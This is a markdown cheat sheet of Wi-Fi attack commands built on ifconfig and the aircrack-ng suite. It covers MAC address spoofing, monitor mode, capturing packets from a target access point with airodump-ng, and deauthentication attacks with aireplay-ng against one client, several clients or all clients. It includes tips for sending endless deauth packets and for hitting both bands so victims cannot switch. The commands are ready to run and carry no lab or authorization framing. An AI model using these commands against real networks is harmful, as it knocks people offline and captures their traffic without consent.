## Listing Interfaces
`ifconfig`
## Enable Interface
`ifconfig <interface-name> up`
## Disable Interface
`ifconfig <interface-name> down`

## Spoof Mac Address
`ifconfig <interface-name> hw ether <new-mac-address>`

# WiFi Band
2.4 -5GHz
abcgn
- a - 5
- b,g - 2.4
- n - 2.4, 5
- ac - < 6 

## Enabling monitor mode
`iwconfig <interface-name> mode monitor`
OR
`airmon-ng start <interface-name>`
## Capture packets and display info on wireless network
`airodump-ng <interface-name>`
ensure adapter is in monitor mode
default band is 2.4GHz

## Change frequency band when checking wireless network
for 5GHz
`airodump-ng --band a <interface-name>`
for both 2.4 and 5GHz
`sudo airodump-ng <interface-name> --band abg`

## Capture packets on an access point
`sudo airodump-ng --channel <access-point-channel> --bssid <access-point-mac-address> <interface-name>`

## Save capture into a file
`sudo airodump-ng --channel <access-point-channel> --write path/to/file --bssid <access-point-mac-address> <interface-name>`


## Deauthentication of a single client on a network
### for 2.4GHz
`aireplay-ng --deauth <number-of-deauth-packets> -a <access-point-mac-address> -c <client-mac-address> <interface-name>`
eg
`aireplay-ng --deauth 10000 -a 11:22:33:44:55 -c 12:23:34:54:56 wlan0`
### for 5GHz
`aireplay-ng --deauth <number-of-deauth-packets> -a <access-point-mac-address> -c <client-mac-address> -D <interface-name>`
## Deauthentication of multiple client on a network
if you want to run in the background ie avoid output of aireplay-ng
this give an avenue to deauth another client
`aireplay-ng --deauth <number-of-deauth-packets> -a <access-point-mac-address> -c <client-mac-address> <interface-name> &>/dev/null &`
it sends this command as a background job
To see background jobs
`jobs`
To stop all jobs
`killall aireplay-ng`
To stop specific jobs
`kill %<job-id>`

## Deauthenticate all clients in a network
Run in first window
`airodump-ng --bssid <access-point-mac-address> --channel <access-point-channel> <interface-name>`
then run this in another window
`aireplay-ng --deauth <number-of-deauth-packet> -a <access-point-mac-address> <interface-name>`

> [!Please note]
> If you want infinite number of deauth packets, set it to 0
> Always watch out for wifis bearing the 2 bands at the same time
> Because if you deauth on one band, the device will switch to the other band. if noticed, deauth both bands
